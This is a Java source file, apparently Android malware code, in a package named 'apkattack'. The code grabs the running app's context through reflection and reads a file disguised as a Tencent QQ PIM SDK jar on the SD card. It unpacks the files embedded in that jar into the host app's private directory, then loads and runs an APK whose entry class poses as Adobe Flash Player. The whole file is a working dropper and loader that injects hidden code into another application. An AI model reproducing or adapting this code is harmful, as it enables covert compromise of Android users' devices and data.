package com.example.apkattack;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import dalvik.system.DexClassLoader;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

@SuppressLint("SdCardPath") public class QQTBZSDex {

	//
	public static void qqtbzsDexRelease(){
		String TAG = "qqtbzsDexRelease";
		
		Log.e(TAG,"start");
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(TAG, "context null");
				return;
			}else{
				Log.e(TAG, "get context ok,package:" +context.getPackageName()+"/" +context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(TAG, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
	        
	        //String packagename = context.getPackageName();
	        //String dexfn = "/data/data/" + packagename + "/app_dex/dex.dex";
	        String dexfn = "/sdcard/qqpim/tmsdk/kcsdk.jar";
	        File dexFile = new File(dexfn);
	        if (dexFile.exists() == false) {
	        	Log.e(TAG, "not found dex file:" + dexfn);
				return;
			}
	        int dexfs = (int)dexFile.length();
	        byte [] buf = new byte[dexfs];
	        FileInputStream fin = new FileInputStream(dexFile);
	        fin.read(buf,0,dexfs);
	        fin.close();

            int offset = dexfs - 1;
            int fc = buf[offset];
            if (fc < 2 || fc > 4) {
	        	Log.e(TAG, "error files count:" + fc);
				return;
			}
            
            String dstpath = context.getFilesDir().getAbsolutePath() + "/";
    		File dstpathFile = new File(dstpath);
    		if (dstpathFile.exists() == false) {
				dstpathFile.mkdirs();
			}
    		
        	String apkfn = "";
        	for (int i = 0; i < fc; i++) {
				offset -= 16;
				int fnlen = 0;
				for( fnlen = 0 ;fnlen < 16; fnlen ++){
					if (buf[offset + fnlen] == 0) {
						break;
					}
				}
				if (fnlen > 16) {
					return;
				}
				byte[]filename = new byte[fnlen];
				System.arraycopy(buf, offset, filename, 0, fnlen);
				String fn = new String(filename);
				if (fn.endsWith(".apk")) {
					apkfn = fn;
				}
				String dstfn = dstpath + fn;

				byte[] bdatasize = new byte[4];
				offset -= 4;
				System.arraycopy(buf, offset, bdatasize, 0, 4);
				int datasize = ((bdatasize[0]&0xff)<<24) +
						((bdatasize[1]&0xff)<<16)+
						((bdatasize[2]&0xff)<<8)+
						((bdatasize[3]&0xff));

				offset -= datasize;
				
				File dstFile = new File(dstfn);
				if (dstFile.exists() == false) {
					dstFile.createNewFile();
				}
				
				FileOutputStream fout = new FileOutputStream(dstFile);
				fout.write(buf,offset,datasize);
				fout.close();
			}
            
	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(dstpath + apkfn, appcachepath, null,context.getClassLoader());
	    	
	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
    	    method.invoke(obj,context,dstpath);
    	    
    	    Log.e(TAG, "qqtbzsDexRelease load apk success");

		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}
}

